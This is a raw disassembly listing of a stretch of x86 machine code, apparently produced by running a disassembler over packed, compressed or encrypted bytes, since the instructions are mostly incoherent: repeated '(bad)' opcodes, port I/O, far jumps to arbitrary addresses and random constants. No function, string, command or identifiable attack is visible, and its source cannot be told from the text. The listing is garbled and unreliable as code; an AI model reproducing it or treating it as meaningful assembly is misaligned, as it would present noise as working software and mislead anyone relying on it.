  41b8d4:	add    DWORD PTR [ebx],ebp
  41b8d6:	sbb    eax,0x38e38987
  41b8db:	leave  
  41b8dc:	dec    esi
  41b8dd:	out    0xff,al
  41b8df:	dec    ebx
  41b8e0:	adc    edi,DWORD PTR [esi+0x38dc7546]
  41b8e6:	lock sbb cl,BYTE PTR [eax-0x7790a01]
  41b8ed:	ins    BYTE PTR es:[edi],dx
  41b8ee:	in     al,0x58
  41b8f0:	adc    DWORD PTR [ecx-0x3f2fc775],ebp
  41b8f6:	lods   eax,DWORD PTR ds:[esi]
  41b8f7:	sbb    al,0x5e
  41b8f9:	imul   ecx,DWORD PTR gs:[ebx-0x6b],0xf2b00c45
  41b901:	mov    edi,DWORD PTR [edi+0x47]
  41b904:	mov    ebp,0xa274ca99
  41b909:	and    edi,ebp
  41b90b:	inc    eax
  41b90c:	cmp    eax,0xa83ebc80
  41b911:	repz fadd st,st(7)
  41b914:	inc    esi
  41b915:	ret    
  41b916:	std    
  41b917:	dec    ecx
  41b918:	mov    ebx,0xdac05bc1
  41b91d:	xchg   ebp,eax
  41b91e:	mov    ecx,0x13fa00c7
  41b923:	test   eax,0x712c0c97
  41b928:	scas   al,BYTE PTR es:[edi]
  41b929:	cmp    cl,cl
  41b92b:	xor    al,cl
  41b92d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b92e:	dec    ebp
  41b92f:	mov    cl,0xec
  41b931:	ret    0x50b4
  41b934:	xor    al,0xa4
  41b936:	test   eax,0x95e022bd
  41b93b:	mov    esp,0x70884c81
  41b940:	cmp    bl,0x69
  41b943:	mov    ebx,0x71c47714
  41b948:	mov    edi,0xf973a2ff
  41b94d:	inc    esi
  41b94e:	inc    edx
  41b94f:	(bad)  
  41b950:	fld    QWORD PTR [esi-0x3d]
  41b953:	jp     0x41b9c7
  41b955:	push   cs
  41b956:	xor    BYTE PTR [edx+ecx*2],ch
  41b959:	pop    eax
  41b95a:	mov    edx,0x5c417999
  41b95f:	clc    
  41b960:	ror    DWORD PTR [ebp-0xf],0x4d
  41b964:	mov    WORD PTR [edx+eax*8-0x37],es
  41b968:	inc    edi
  41b969:	mov    esi,fs
  41b96b:	push   0xffffffb4
  41b96d:	test   DWORD PTR [ecx+esi*1-0x1ad965a0],ecx
  41b974:	and    DWORD PTR [edx+0x77],esi
  41b977:	shr    ebp,1
  41b979:	xchg   edi,eax
  41b97a:	xor    edi,esi
  41b97c:	mov    bh,0xcd
  41b97e:	ja     0x41b9a5
  41b980:	scas   eax,DWORD PTR es:[edi]
  41b981:	daa    
  41b982:	cwde   
  41b983:	dec    eax
  41b984:	ret    
  41b985:	daa    
  41b986:	push   edx
  41b987:	jbe    0x41b9d5
  41b989:	aad    0xdb
  41b98b:	fild   QWORD PTR [ebx-0x7ae91200]
  41b991:	push   edi
  41b992:	adc    DWORD PTR [eax+0x71],esp
  41b995:	xor    ecx,DWORD PTR [ecx-0x38]
  41b998:	popa   
  41b999:	cmp    al,0x10
  41b99b:	mov    al,0x48
  41b99d:	js     0x41b993
  41b99f:	inc    ebx
  41b9a0:	jb     0x41b9a3
  41b9a2:	sbb    eax,0x43488da8
  41b9a7:	dec    esp
  41b9a8:	jp     0x41b969
  41b9aa:	xor    al,0xa1
  41b9ac:	outs   dx,BYTE PTR ds:[esi]
  41b9ad:	dec    ebx
  41b9ae:	int    0x4f
  41b9b0:	cld    
  41b9b1:	and    al,0xfa
  41b9b3:	push   ds
  41b9b4:	retf   0x3c7
  41b9b7:	fadd   DWORD PTR [edx-0x3e]
  41b9ba:	in     al,0x9f
  41b9bc:	mov    eax,0x9d6e8c1b
  41b9c1:	push   0x9991d82a
  41b9c6:	jmp    FWORD PTR ds:0xd2a14cee
  41b9cc:	cmp    bl,bh
  41b9ce:	mov    esi,0xb27290ff
  41b9d3:	int3   
  41b9d4:	outs   dx,BYTE PTR ds:[esi]
  41b9d5:	cmp    ecx,DWORD PTR [esi+0x173cbc56]
  41b9db:	loopne 0x41b9cd
  41b9dd:	pushf  
  41b9de:	scas   al,BYTE PTR es:[edi]
  41b9df:	xchg   dl,al
  41b9e1:	fistp  QWORD PTR [ebx]
  41b9e3:	and    DWORD PTR [esi],eax
  41b9e5:	fidiv  DWORD PTR [ebx+eax*2+0x52315bd]
  41b9ec:	or     al,0x39
  41b9ee:	push   ebx
  41b9ef:	popa   
  41b9f0:	add    BYTE PTR [eax-0x398ffe3a],0x93
  41b9f7:	into   
  41b9f8:	sbb    ebx,DWORD PTR [ebx]
  41b9fa:	fldenv es:0xe1d53aa9
  41ba01:	cli    
  41ba02:	mov    bl,0x5f
  41ba04:	sub    ch,BYTE PTR [ebx-0x55f0708a]
  41ba0a:	sub    DWORD PTR ds:0x51e3cfee,esi
  41ba10:	push   edx
  41ba11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba12:	(bad)  
  41ba13:	fs push ecx
  41ba15:	arpl   WORD PTR ds:0x240bbfd7,ax
  41ba1b:	sbb    ah,BYTE PTR [ebp-0x124b1a4a]
  41ba21:	and    ch,ch
  41ba23:	imul   edi,DWORD PTR [ecx+0x5e],0x65
  41ba27:	jns    0x41b9bb
  41ba29:	aas    
  41ba2a:	jge    0x41ba5c
  41ba2c:	push   eax
  41ba2d:	stos   BYTE PTR es:[edi],al
  41ba2e:	jbe    0x41ba94
  41ba30:	outs   dx,DWORD PTR ds:[esi]
  41ba31:	sti    
  41ba32:	push   ds
  41ba33:	add    DWORD PTR ds:0xb48d5f9,esp
  41ba39:	not    BYTE PTR [ebx-0x518dbf48]
  41ba3f:	inc    ebp
  41ba40:	cwde   
  41ba41:	mov    dl,0x0
  41ba43:	or     eax,0xd02f331
  41ba48:	xchg   ecx,eax
  41ba49:	sar    BYTE PTR [bx+si+0x8],0x16
  41ba4e:	xor    dh,BYTE PTR [ebp-0x3f70413]
  41ba54:	mov    ebx,0xffa2bbf
  41ba59:	sbb    DWORD PTR [ecx-0x1ef54d82],0x27
  41ba60:	xchg   ebx,eax
  41ba61:	and    dl,BYTE PTR [ebp+0x58]
  41ba64:	scas   eax,DWORD PTR es:[edi]
  41ba65:	sub    eax,DWORD PTR [edx-0x11]
  41ba68:	adc    BYTE PTR [edi],cl
  41ba6a:	out    0x15,al
  41ba6c:	daa    
  41ba6d:	jg     0x41bace
  41ba6f:	cmp    dh,BYTE PTR [edx+0x2d]
  41ba72:	jo     0x41b9f6
  41ba74:	adc    al,0x9a
  41ba76:	fiadd  DWORD PTR [eax+0x13fa366]
  41ba7c:	(bad)  
  41ba7e:	lds    esp,FWORD PTR [edx+0x5b152a24]
  41ba84:	jl     0x41ba24
  41ba86:	mov    dh,0x63
  41ba88:	mov    ah,0x69
  41ba8a:	mov    ch,0x66
  41ba8c:	xor    BYTE PTR [ebx+ebx*8+0x60],ah
  41ba90:	mov    al,ds:0xb9d0643b
  41ba95:	jbe    0x41ba93
  41ba97:	sub    al,0x19
  41ba99:	mov    dh,0x1f
  41ba9b:	mov    al,0xc9
  41ba9d:	in     eax,0xb8
  41ba9f:	sahf   
  41baa0:	push   es
  41baa1:	adc    ecx,esp
  41baa3:	pop    ss
  41baa4:	cmp    eax,0x7a18dabd
  41baa9:	push   es
  41baaa:	mov    bh,0xd6
  41baac:	jno    0x41bae9
  41baae:	xchg   esi,edx
  41bab0:	mov    dl,0xce
  41bab2:	dec    esi
  41bab3:	lods   al,BYTE PTR ds:[esi]
  41bab4:	out    dx,al
  41bab5:	loopne 0x41bad9
  41bab7:	jl     0x41ba68
  41bab9:	dec    ecx
  41baba:	clc    
  41babb:	pusha  
  41babc:	fwait
  41babd:	xchg   esp,eax
  41babe:	cmp    al,0x58
  41bac0:	jmp    0xc1dd:0x58c42649
  41bac7:	pop    esi
  41bac8:	sbb    al,0xfc
  41baca:	mov    ah,0x4a
  41bacc:	inc    edi
  41bacd:	je     0x41bb2d
  41bacf:	sub    esp,DWORD PTR [edx]
  41bad1:	rcl    BYTE PTR [ecx-0x2a9b31cc],cl
  41bad7:	mov    edi,ecx
  41bad9:	mov    ah,0x2d
  41badb:	mov    ch,0x7c
  41badd:	add    eax,0xee443f69
  41bae2:	cmp    al,0x6a
  41bae4:	ror    DWORD PTR [edx-0x6fb0e88b],1
  41baea:	add    bh,BYTE PTR [eax]
  41baec:	push   ss
  41baed:	icebp  
  41baee:	out    0x7e,al
  41baf0:	call   0x43647610
  41baf5:	jge    0x41bb45
  41baf7:	xchg   ebp,eax
  41baf8:	sub    al,0x63
  41bafa:	jle    0x41bb44
  41bafc:	push   ebp
  41bafd:	leave  
  41bafe:	mov    cl,0x7a
  41bb00:	mov    es,WORD PTR [esi+0x25]
  41bb03:	pop    ds
  41bb04:	sub    ebp,DWORD PTR [ebx]
  41bb06:	es mov dh,0x17
  41bb09:	ja     0x41bb33
  41bb0b:	cs add al,0x73
  41bb0e:	dec    ebp
  41bb0f:	in     eax,0x95
  41bb11:	dec    esi
  41bb12:	pop    edi
  41bb13:	mov    ebx,0x3a3cafe3
  41bb18:	inc    esi
  41bb19:	adc    al,0x2f
  41bb1b:	sbb    al,0xf
  41bb1d:	dec    eax
  41bb1e:	fwait
  41bb1f:	jecxz  0x41bb19
  41bb21:	pusha  
  41bb22:	cmp    DWORD PTR [ebp+0x24],edi
  41bb25:	add    BYTE PTR [ecx],ch
  41bb27:	mov    esp,0xc6245a92
  41bb2c:	lea    esp,[ecx-0x41895817]
  41bb32:	(bad)  
  41bb33:	cmp    BYTE PTR [edi],bh
  41bb35:	push   es
  41bb36:	out    dx,eax
  41bb37:	cmp    DWORD PTR [esi+0x459d4549],esi
  41bb3d:	mov    ah,BYTE PTR [edx]
  41bb3f:	mov    ebp,ecx
  41bb41:	or     al,0x88
  41bb43:	icebp  
  41bb44:	enter  0xd6b9,0x82
  41bb48:	xchg   edx,eax
  41bb49:	mov    esp,0xa4a69d2d
  41bb4e:	push   ebx
  41bb4f:	adc    DWORD PTR [ebx+0x6c],esp
  41bb52:	jle    0x41bbb8
  41bb54:	scas   eax,DWORD PTR es:[edi]
  41bb55:	test   BYTE PTR [eax+0x724939df],0x16
  41bb5c:	add    al,0x44
  41bb5e:	jecxz  0x41bb53
  41bb60:	(bad)  
  41bb62:	cmp    eax,0x347ff3d8
  41bb67:	gs (bad) 
  41bb69:	popa   
  41bb6a:	sub    eax,ebp
  41bb6c:	pop    edx
  41bb6d:	sar    edx,1
  41bb6f:	mov    edi,0x8810b31d
  41bb74:	dec    esi
  41bb75:	sbb    edx,DWORD PTR [esi-0x70218b4b]
  41bb7b:	mov    bl,0xcc
  41bb7d:	mov    ah,0xa7
  41bb7f:	push   cs
  41bb80:	push   ss
  41bb81:	test   DWORD PTR [ebx+0x768fde49],ebp
  41bb87:	add    al,0x16
  41bb89:	jp     0x41bb97
  41bb8b:	call   DWORD PTR [ebx]
  41bb8d:	xchg   ecx,eax
  41bb8e:	nop
  41bb8f:	adc    edx,esp
  41bb91:	iret   
  41bb92:	lahf   
  41bb93:	mov    ch,0x3a
  41bb95:	push   ebp
  41bb96:	mov    ds:0xee83e438,al
  41bb9b:	add    al,0x7
  41bb9d:	xchg   ebp,eax
  41bb9e:	mov    ds:0x70a36b7f,eax
  41bba3:	mov    WORD PTR [edi+esi*4],?
  41bba6:	(bad)  
  41bba8:	dec    esi
  41bba9:	test   BYTE PTR [ecx-0x2623364d],0xc8
  41bbb0:	mov    eax,ds:0xcb4fd3cf
  41bbb5:	test   al,bl
  41bbb7:	jne    0x41bc1b
  41bbb9:	int3   
  41bbba:	adc    DWORD PTR [edi+0x5f098c99],esp
  41bbc0:	cwde   
  41bbc1:	jnp    0x41bb77
  41bbc3:	xchg   DWORD PTR [ebx-0x17],ebx
  41bbc6:	retf   
  41bbc7:	(bad)  
  41bbc8:	std    
  41bbc9:	je     0x41bbff
  41bbcb:	xor    esp,DWORD PTR [ebp-0x70]
  41bbce:	sbb    al,0x68
  41bbd0:	push   ecx
  41bbd1:	cli    
  41bbd2:	(bad)  
  41bbd3:	jle    0x41bbfc
  41bbd5:	(bad)  
  41bbd6:	fistp  QWORD PTR [ebx+0x34]
  41bbd9:	xor    al,0x8d
  41bbdb:	shl    DWORD PTR [edx+eiz*1],1
  41bbde:	or     DWORD PTR [ecx+0x1b86cc8d],0x2d
  41bbe5:	cmp    DWORD PTR [esi],esi
  41bbe7:	or     dh,BYTE PTR [esi+0x3b]
  41bbea:	inc    edx
  41bbeb:	push   ebx
  41bbec:	stc    
  41bbed:	inc    eax
  41bbee:	cmp    ecx,eax
  41bbf0:	aaa    
  41bbf1:	inc    edi
  41bbf2:	clc    
  41bbf3:	add    BYTE PTR [edx],ah
  41bbf5:	jne    0x41bbd6
  41bbf7:	rcl    BYTE PTR [esp+ebp*2+0x11],0xac
  41bbfc:	pusha  
  41bbfd:	inc    ebx
  41bbfe:	pop    esi
  41bbff:	xor    DWORD PTR [edi],ecx
  41bc01:	jmp    0x41bc53
  41bc03:	lods   al,BYTE PTR ds:[esi]
  41bc04:	mov    ebx,0xc598497e
  41bc09:	(bad)  
  41bc0a:	and    dh,ch
  41bc0c:	push   esi
  41bc0d:	mov    cs,WORD PTR [edx+ebx*4]
  41bc10:	shl    BYTE PTR [ebx],1
  41bc12:	mov    al,ds:0x4cfe7b3b
  41bc17:	push   ds
  41bc18:	cwde   
  41bc19:	rol    DWORD PTR [edi+0xa613fcc],0xfd
  41bc20:	jbe    0x41bbe5
  41bc22:	arpl   WORD PTR [esi],sp
  41bc24:	xlat   BYTE PTR ds:[ebx]
  41bc25:	jp     0x41bc12
  41bc27:	xchg   ebp,eax
  41bc28:	mov    ch,0xe2
  41bc2a:	sub    BYTE PTR [ebx+0x107458ce],0x62
  41bc31:	xor    BYTE PTR [ecx-0x6f2468cd],0xb4
  41bc38:	mov    bl,al
  41bc3a:	mov    eax,0xfa346ad1
  41bc3f:	pop    ebp
  41bc40:	xchg   DWORD PTR [ecx+0x7d604e99],ecx
  41bc46:	push   ebx
  41bc47:	pop    es
  41bc48:	test   eax,0x7946d907
  41bc4d:	outs   dx,BYTE PTR ds:[esi]
  41bc4e:	dec    edx
  41bc4f:	loopne 0x41bbe3
  41bc51:	inc    edx
  41bc52:	add    eax,0xab21d34b
  41bc57:	iret   
  41bc58:	mov    al,0x81
  41bc5a:	mov    bl,0x1c
  41bc5c:	clc    
  41bc5d:	sti    
  41bc5e:	add    esp,DWORD PTR [ecx-0x47]
  41bc61:	and    al,0x1b
  41bc63:	rcl    DWORD PTR [ebp-0x1bdbd0fd],1
  41bc69:	rcr    BYTE PTR [edi-0x54],1
  41bc6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc6d:	sbb    DWORD PTR [edx],0xffffffaf
  41bc70:	nop
  41bc71:	mov    ah,0x22
  41bc73:	fnstsw WORD PTR [ebx]
  41bc75:	xchg   esp,eax
  41bc76:	xor    dh,dh
  41bc78:	rcl    DWORD PTR [edx+0x2f],0x93
  41bc7c:	data16 ds mov cl,0x3
  41bc80:	inc    esp
  41bc81:	sbb    al,0x1b
  41bc83:	xor    esi,DWORD PTR [ebx+0x2e543654]
  41bc89:	xchg   edx,eax
  41bc8a:	xor    BYTE PTR [ebx],al
  41bc8c:	aaa    
  41bc8d:	mov    bh,BYTE PTR [esi-0x5b]
  41bc90:	pop    eax
  41bc91:	or     eax,0xd097ef99
  41bc96:	aas    
  41bc97:	mov    dh,0x6e
  41bc99:	jne    0x41bcd6
  41bc9b:	dec    ecx
  41bc9c:	ss inc ebx
  41bc9e:	xor    eax,0xb95b3e1b
  41bca3:	cli    
  41bca4:	add    esi,edi
  41bca6:	mov    dh,0x7a
  41bca8:	jbe    0x41bcf9
  41bcaa:	ins    DWORD PTR es:[edi],dx
  41bcab:	stos   BYTE PTR es:[edi],al
  41bcac:	ret    0xa8a3
  41bcaf:	clc    
  41bcb0:	add    BYTE PTR [esi+ecx*8],bl
  41bcb3:	cmp    edi,ebp
  41bcb5:	pop    ecx
  41bcb6:	pusha  
  41bcb7:	mov    ah,0x97
  41bcb9:	and    DWORD PTR [ebp+0x65b8b9ff],ebx
  41bcbf:	jmp    0x8e2df137
  41bcc4:	ss mov cl,0xb
  41bcc7:	cmp    DWORD PTR [edi+0x5fff09a8],0x6d57d453
  41bcd1:	pop    es
  41bcd2:	push   0xffffffd4
  41bcd4:	outs   dx,BYTE PTR ds:[esi]
  41bcd5:	mov    ecx,0xe3268089
  41bcda:	add    ecx,0x44368b16
  41bce0:	or     esp,edi
  41bce2:	push   0xffffffdc
  41bce4:	je     0x41bcf2
  41bce6:	xor    BYTE PTR [eax],bl
  41bce8:	stos   DWORD PTR es:[edi],eax
  41bce9:	xor    DWORD PTR [edx+0x46dc12a8],edx
  41bcef:	fld    QWORD PTR [esi-0xb]
  41bcf2:	pop    ss
  41bcf3:	inc    edx
  41bcf4:	lahf   
  41bcf5:	xor    esp,DWORD PTR [ebp+0x5b]
  41bcf8:	xchg   esi,eax
  41bcf9:	and    al,0x28
  41bcfb:	mov    bh,bh
  41bcfd:	sar    DWORD PTR [esi],0xc1
  41bd00:	lds    ecx,FWORD PTR [edx+0x5dc6d7e0]
  41bd06:	fcomp  QWORD PTR [ebx]
  41bd08:	jecxz  0x41bcb7
  41bd0a:	rol    bh,1
  41bd0c:	in     al,0x8
  41bd0e:	(bad)  
  41bd0f:	mov    ds:0x46812fc4,eax
  41bd14:	out    dx,al
  41bd15:	ret    
  41bd16:	sub    BYTE PTR [edi-0x5bee7e27],0xec
  41bd1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd1e:	sub    ecx,DWORD PTR [eax+0x2c9db3d0]
  41bd24:	lods   eax,DWORD PTR ds:[esi]
  41bd25:	sub    eax,0x90471da3
  41bd2a:	adc    ebp,DWORD PTR [ebp+0x367cc5ed]
  41bd30:	pop    ebp
  41bd31:	out    dx,al
  41bd32:	xor    BYTE PTR [ebp-0x5fbe0861],0xab
  41bd39:	popa   
  41bd3a:	mov    edi,0x192f33a1
  41bd3f:	out    0x31,al
  41bd41:	mov    ?,WORD PTR [ebx+0x3d67fff5]
  41bd47:	rcl    BYTE PTR [esi-0xcc7cad7],0x79
  41bd4e:	repz lahf 
  41bd50:	sbb    esi,edx
  41bd52:	(bad)  
  41bd54:	pop    ecx
  41bd55:	or     al,0x48
  41bd57:	loope  0x41bdb5
  41bd59:	mov    dh,0xfa
  41bd5b:	imul   ebp,DWORD PTR [ebp+0x1],0xffffff8e
  41bd5f:	fsubr  DWORD PTR [eax-0x6]
  41bd62:	mov    ds:0x86fb060,eax
  41bd67:	or     eax,0x15809e68
  41bd6c:	loop   0x41bcfd
  41bd6e:	rcr    ch,1
  41bd70:	sub    ch,BYTE PTR ds:0x202ee287
  41bd76:	test   DWORD PTR [ebp-0x71],ebx
  41bd79:	or     eax,0x3e19cd3f
  41bd7e:	mov    al,ds:0x8b27a68e
  41bd83:	cmp    al,0x5b
  41bd85:	and    DWORD PTR ds:0x512c1489,ebp
  41bd8b:	cs dec ebx
  41bd8d:	jmp    0xbd1adc49
  41bd92:	xchg   esp,eax
  41bd93:	dec    edi
  41bd94:	add    edx,ebp
  41bd96:	loopne 0x41bd3b
  41bd98:	inc    edx
  41bd99:	out    0x6c,al
  41bd9b:	(bad)  
  41bd9c:	push   esi
  41bd9d:	dec    edx
  41bd9e:	pop    edi
  41bd9f:	mov    ds:0x2c21f6cf,eax
  41bda4:	xchg   ebx,eax
  41bda5:	pop    eax
  41bda6:	pop    esp
  41bda7:	cs xchg ebx,eax
  41bda9:	(bad)  
  41bdaa:	jecxz  0x41bd62
  41bdac:	shl    BYTE PTR [ebx-0x21725dd1],0x4e
  41bdb3:	arpl   ax,si
  41bdb5:	dec    ebx
  41bdb6:	pop    edi
  41bdb7:	out    dx,eax
  41bdb8:	(bad)  
  41bdba:	ins    DWORD PTR es:[edi],dx
  41bdbb:	lods   al,BYTE PTR ds:[esi]
  41bdbc:	test   eax,0x79f8a131
  41bdc1:	cmp    BYTE PTR [esi-0x7d31783e],al
  41bdc7:	repz or ah,BYTE PTR [edx]
  41bdca:	cmp    ebp,DWORD PTR [ebp+0x3]
  41bdcd:	(bad)  
  41bdce:	xor    esp,esp
  41bdd0:	inc    ecx
  41bdd1:	imul   ebx,DWORD PTR [eax],0x6f
  41bdd4:	jl     0x41bdcb
  41bdd6:	adc    al,0x9d
  41bdd8:	rol    BYTE PTR [ebp+ebx*8+0x33ed8f64],0x1e
  41bde0:	in     al,0xea
  41bde2:	xor    ebp,DWORD PTR [ecx]
  41bde4:	fld    DWORD PTR [esi-0x231308dd]
  41bdea:	jecxz  0x41bd78
  41bdec:	xor    esi,esi
  41bdee:	add    al,0xb5
  41bdf0:	retf   0x7af
  41bdf3:	push   ss
  41bdf4:	push   eax
  41bdf5:	push   ebx
  41bdf6:	(bad)  
  41bdf7:	cmp    BYTE PTR [edx+0x1e],cl
  41bdfa:	push   esi
  41bdfb:	cld    
  41bdfc:	xor    al,bl
  41bdfe:	adc    ebp,ebx
  41be00:	jmp    0x41be00
  41be02:	lods   eax,DWORD PTR ds:[esi]
  41be03:	mov    ecx,0x385703ff
  41be08:	test   DWORD PTR [ebx-0x8df515d],ebx
  41be0e:	dec    eax
  41be0f:	imul   edx,DWORD PTR [ebx+0x22],0xffffffe5
  41be13:	inc    edx
  41be14:	cmp    eax,0x8281e36f
  41be19:	dec    ecx
  41be1a:	adc    BYTE PTR [ebp+0x4be780ee],al
  41be20:	jg     0x41bdcb
  41be22:	or     ebp,DWORD PTR [edx-0x57b580e6]
  41be28:	dec    ebx
  41be29:	fiadd  DWORD PTR [eax-0x43]
  41be2c:	dec    edx
  41be2d:	aas    
  41be2e:	sbb    DWORD PTR [esi],esp
  41be30:	popa   
  41be31:	cdq    
  41be32:	or     BYTE PTR [edx+0x29fa85d2],0x50
  41be39:	pusha  
  41be3a:	inc    edx
  41be3b:	sahf   
  41be3c:	xor    DWORD PTR [ebx-0x42],ebx
  41be3f:	fild   DWORD PTR [edx-0x2d]
  41be42:	jecxz  0x41be8c
  41be44:	sahf   
  41be45:	std    
  41be46:	or     BYTE PTR [edx],cl
  41be48:	jmp    0xf2fd9c18
  41be4d:	int    0xd0
  41be4f:	push   ecx
  41be50:	jb     0x41be2b
  41be52:	jbe    0x41bebc
  41be54:	fwait
  41be55:	jbe    0x41be39
  41be57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be58:	inc    ecx
  41be59:	lea    eax,[ecx-0x727d9fcf]
  41be5f:	out    dx,al
  41be60:	repz cmc 
  41be62:	fild   DWORD PTR [eax]
  41be64:	ja     0x41bec7
  41be66:	sub    cl,BYTE PTR [edi+0x2b]
  41be69:	leave  
  41be6a:	jle    0x41be41
  41be6c:	bound  edi,QWORD PTR [ecx+0x56]
  41be6f:	bound  ebp,QWORD PTR [esp+edx*8-0x7]
  41be73:	adc    al,0x7d
  41be75:	or     al,0x40
  41be77:	imul   ebp,DWORD PTR [eax+0x59],0x64
  41be7b:	aad    0xca
  41be7d:	inc    esp
  41be7e:	jmp    0x41be96
  41be80:	std    
  41be81:	and    BYTE PTR [eax-0x55],0xed
  41be85:	and    ah,BYTE PTR [eax]
  41be87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be88:	pusha  
  41be89:	mov    edx,0x39683a86
  41be8e:	(bad)  
  41be8f:	inc    ecx
  41be90:	enter  0x62e4,0xe0
  41be94:	mov    DWORD PTR [edx-0x68],ebx
  41be97:	iret   
  41be98:	add    BYTE PTR [edi+ebx*2+0x2b],0x8d
  41be9d:	(bad)  
  41be9f:	mov    ecx,0x57e41cef
  41bea4:	mov    ah,0x16
  41bea6:	dec    esp
  41bea7:	dec    edi
  41bea8:	cmp    dh,ah
  41beaa:	mov    ah,0x47
  41beac:	push   ecx
  41bead:	js     0x41bea4
  41beaf:	mov    BYTE PTR [ebp+0x7d949e6f],bl
  41beb5:	and    DWORD PTR [edx-0x5d1e255c],edx
  41bebb:	lods   al,BYTE PTR ds:[esi]
  41bebc:	call   0x47a2:0x8e551ddc
  41bec3:	mov    ah,0xca
  41bec5:	xchg   ebp,eax
  41bec6:	dec    ebp
  41bec7:	leave  
  41bec8:	jmp    0x29bc5f3e
  41becd:	stos   BYTE PTR es:[edi],al
  41bece:	sbb    eax,0xb19337b3
  41bed3:	mov    ah,BYTE PTR [eax-0x2a]
  41bed6:	or     al,0x8f
  41bed8:	lods   eax,DWORD PTR ds:[esi]
  41bed9:	inc    edi
  41beda:	push   edx
  41bedb:	jnp    0x41be6b
  41bedd:	aad    0x44
  41bedf:	pop    es
  41bee0:	mov    ecx,0x854d33e1
  41bee5:	ja     0x41bebd
  41bee7:	or     esi,DWORD PTR [esi+0x12bba772]
  41beed:	cmp    DWORD PTR [eax+0xf],0x5d
  41bef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bef2:	mov    cl,0x22
  41bef4:	dec    ebx
  41bef5:	arpl   WORD PTR [ecx+0x3036ce3a],cx
  41befb:	repnz push ss
  41befd:	popf   
  41befe:	xor    ah,cl
  41bf00:	sbb    BYTE PTR [edi],ch
  41bf02:	adc    esp,ecx
  41bf04:	sbb    bl,BYTE PTR [eax-0x60be3b24]
  41bf0a:	iret   
  41bf0b:	(bad)  
  41bf0c:	jmp    0xc818a195
  41bf11:	inc    DWORD PTR [edi]
  41bf13:	ds enter 0xb1cc,0x44
  41bf18:	xchg   esp,eax
  41bf19:	pop    esi
  41bf1a:	cmp    dl,BYTE PTR [edi-0x61]
  41bf1d:	daa    
  41bf1e:	daa    
  41bf1f:	xor    bl,bh
  41bf21:	sub    DWORD PTR [esi-0x6],eax
  41bf24:	sti    
  41bf25:	inc    esp
  41bf26:	jae    0x41bf36
  41bf28:	cmp    eax,edx
  41bf2a:	out    dx,al
  41bf2b:	ds add al,0xd8
  41bf2e:	loope  0x41bf05
  41bf30:	push   esi
  41bf31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf32:	and    ebx,DWORD PTR [edx]
  41bf34:	(bad)  
  41bf35:	retf   0x8fef
  41bf38:	cmp    DWORD PTR [ebx-0x65e3e1ee],esp
  41bf3e:	push   ss
  41bf3f:	ror    BYTE PTR [edi-0x63531eaf],cl
  41bf45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf46:	mov    esp,DWORD PTR [edi-0x2cb4b082]
  41bf4c:	lds    ebp,FWORD PTR [edx+0x67]
  41bf4f:	xor    eax,0x3bb20906
  41bf54:	add    al,0x2
  41bf56:	or     al,0xb1
  41bf58:	mul    BYTE PTR [esi+0x3d07d3a2]
  41bf5e:	xor    DWORD PTR [esp+ebx*8],ebp
  41bf61:	out    dx,eax
  41bf62:	or     ebp,0x57
  41bf65:	popa   
  41bf66:	sahf   
  41bf67:	mov    esi,0xd2556fb
  41bf6c:	inc    edx
  41bf6d:	fmul   QWORD PTR [edi]
  41bf6f:	mov    bh,0x7
  41bf71:	mov    al,0x9b
  41bf73:	push   esp
  41bf74:	mov    ecx,0x825fc92a
  41bf79:	shr    BYTE PTR [esi+eax*2],cl
  41bf7c:	sahf   
  41bf7d:	lds    ebx,FWORD PTR [edi]
  41bf7f:	arpl   WORD PTR [esp+ecx*2],di
  41bf82:	idiv   BYTE PTR [eax-0x64]
  41bf85:	aam    0x1d
  41bf87:	cmp    eax,0xfffffff1
  41bf8a:	das    
  41bf8b:	sub    BYTE PTR [ecx],ah
  41bf8d:	mov    al,0x3
  41bf8f:	jmp    0x939d:0x6ada8bea
  41bf96:	outs   dx,DWORD PTR ds:[esi]
  41bf97:	mov    bl,0x6b
  41bf99:	mov    cl,BYTE PTR ds:0xab9caf61
  41bf9f:	mov    ecx,0x67cf5e96
  41bfa4:	pushf  
  41bfa5:	in     eax,dx
  41bfa6:	push   0xffffff9a
  41bfa8:	cwde   
  41bfa9:	push   0xbb89c8d2
  41bfae:	push   esp
  41bfaf:	xor    BYTE PTR [ebp-0x50d9d8f8],dl
  41bfb5:	inc    esp
  41bfb6:	or     al,BYTE PTR [esp+ebp*4+0x3e6d9ba7]
  41bfbd:	stos   BYTE PTR es:[edi],al
  41bfbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfbf:	mov    bh,0x29
  41bfc1:	mov    dl,0x16
  41bfc3:	push   ds
  41bfc4:	lods   eax,DWORD PTR ds:[esi]
  41bfc5:	inc    ebp
  41bfc6:	int    0x76
  41bfc8:	add    esp,eax
  41bfca:	repnz dec ebp
  41bfcc:	inc    ebp
  41bfcd:	cmps   DWORD PTR gs:[si],DWORD PTR es:[di]
  41bfd0:	jecxz  0x41bf72
  41bfd2:	jns    0x41c012
  41bfd4:	scas   eax,DWORD PTR es:[edi]
  41bfd5:	repz mov bh,0x6
  41bfd8:	cmp    ebx,DWORD PTR ds:0x356a4212
  41bfde:	in     al,dx
  41bfdf:	push   ebp
  41bfe0:	sub    DWORD PTR [edi],ebx
  41bfe2:	and    esp,esp
  41bfe4:	pusha  
  41bfe5:	xor    DWORD PTR [edx+0x7bbbda5d],esp
  41bfeb:	idiv   DWORD PTR [ebp+0x6819aa34]
  41bff1:	adc    al,0xc5
  41bff3:	outs   dx,BYTE PTR ds:[esi]
  41bff4:	loop   0x41bff2
  41bff6:	sti    
  41bff7:	das    
  41bff8:	cwde   
  41bff9:	ret    0x93de
  41bffc:	jo     0x41c031
  41bffe:	mov    dl,0x33
  41c000:	pop    ecx
  41c001:	hlt    
  41c002:	xchg   edx,eax
  41c003:	xchg   edx,eax
  41c004:	jns    0x41bf98
  41c006:	and    al,BYTE PTR [edi-0x4a]
  41c009:	nop
  41c00a:	xor    DWORD PTR [ebx-0x448fce96],ebp
  41c010:	int3   
  41c011:	ror    ebx,1
